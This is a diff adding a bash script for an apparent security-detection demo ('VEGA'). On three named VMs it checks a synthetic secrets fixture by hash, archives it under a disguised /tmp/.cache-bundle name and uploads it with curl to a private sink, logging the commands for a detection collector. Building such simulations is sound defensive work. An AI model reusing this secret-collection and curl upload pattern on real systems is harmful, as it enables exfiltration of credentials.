@@ -1,0 +1,65 @@
+#!/usr/bin/env bash
+# Live VEGA demo. Only the known synthetic vault fixture can leave the VM,
+# and only for the fixed sink on the private Multipass bridge.
+set -euo pipefail
+umask 077
+
+case $(hostname) in
+  vm-a|vm-b) sha=9233861fac4806f30741846771939b9c11478e21b63ca0d01e2e580c0676fea7 ;;
+  vm-c) sha=e9b2b849a715ca98f7acaeb4276d4d9f3a4b4faa1d758d2f4f0ecd189e7b5973 ;;
+  *) printf 'This command is only for the three VEGA demo VMs.\n' >&2; exit 1 ;;
+esac
+if (( $# )); then
+  printf 'Usage: ~/malicious-script\n' >&2
+  exit 2
+fi
+
+work=$(mktemp -d /tmp/vega-vault-demo.XXXXXXXX)
+archive=''
+cleanup() {
+  if [[ -n $archive ]]; then rm -f -- "$archive"; fi
+  rm -f -- "$work/secrets.txt"
+  rmdir -- "$work"
+}
+trap cleanup EXIT
+trap 'exit 130' INT
+trap 'exit 143' TERM
+cd -- "$work"
+
+"$HOME/sensitive_data/open" --output secrets.txt
+if ! printf '%s  secrets.txt\n' "$sha" | sha256sum -c --status; then
+  printf 'Not the known synthetic fixture. Nothing will be archived or uploaded.\n' >&2
+  exit 1
+fi
+
+# The collector tails Bash history; save the actual commands run here because
+# Bash does not normally write commands from non-interactive scripts.
+record_command() {
+  local command_line
+  printf -v command_line '%q ' "$@"
+  history -s "${command_line% }"
+  history -a "$HOME/.bash_history"
+}
+
+archive=$(mktemp /tmp/.cache-bundle-XXXXXXXX.tgz)
+tar_command=(tar -czf "$archive" secrets.txt)
+"${tar_command[@]}"
+record_command "${tar_command[@]}"
+printf 'Archive created: %s\n' "$archive"
+
+upload_command=(curl --disable --noproxy '*' -fsS --max-time 10 --data-binary "@$archive" http://10.97.0.1:8443/upload)
+if receipt=$("${upload_command[@]}"); then
+  upload_status=0
+else
+  upload_status=$?
+fi
+record_command "${upload_command[@]}"
+# Leave the archive long enough for the file poller and the command-based
+# network collector to observe its metadata, then remove both local copies.
+sleep 3
+if (( upload_status )); then
+  printf 'Upload failed (curl exit %s).\n' "$upload_status" >&2
+  exit "$upload_status"
+fi
+printf 'Local sink reply: %s\n' "$receipt"
+printf 'Live activity complete. Watch the VEGA dashboard for Sentinel findings.\n'
